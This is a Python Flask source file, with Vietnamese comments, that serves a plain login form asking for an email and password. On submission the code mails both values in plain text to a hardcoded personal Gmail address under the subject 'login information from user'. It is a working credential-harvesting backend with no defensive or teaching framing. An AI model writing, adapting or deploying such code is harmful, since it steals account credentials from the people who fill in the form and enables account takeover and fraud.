from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form['email']
        password = request.form['password']

        # Cấu hình gửi email
        to = "thiennhan02032008@gmail.com"
        subject = "Thông tin đăng nhập từ người dùng"
        message = f"Email: {email}\nMật khẩu: {password}"

        msg = MIMEText(message)
        msg['Subject'] = subject
        msg['From'] = "no-reply@yourdomain.com"  # Thay đổi "yourdomain.com" bằng tên miền của bạn
        msg['To'] = to

        try:
            with smtplib.SMTP('smtp.yourdomain.com', 587) as server:  # Thay đổi theo SMTP của bạn
                server.starttls()
                server.login("your_email@yourdomain.com", "your_email_password")
                server.sendmail("no-reply@yourdomain.com", to, msg.as_string())
            return "Thông tin đăng nhập đã được gửi!"
        except Exception as e:
            return f"Không thể gửi thông tin. Vui lòng thử lại. Error: {str(e)}"

    return '''
        <form method="POST">
            Email: <input type="email" name="email"><br>
            Mật khẩu: <input type="password" name="password"><br>
            <input type="submit" value="Submit">
        </form>
    '''

if __name__ == "__main__":
    app.run(debug=True)

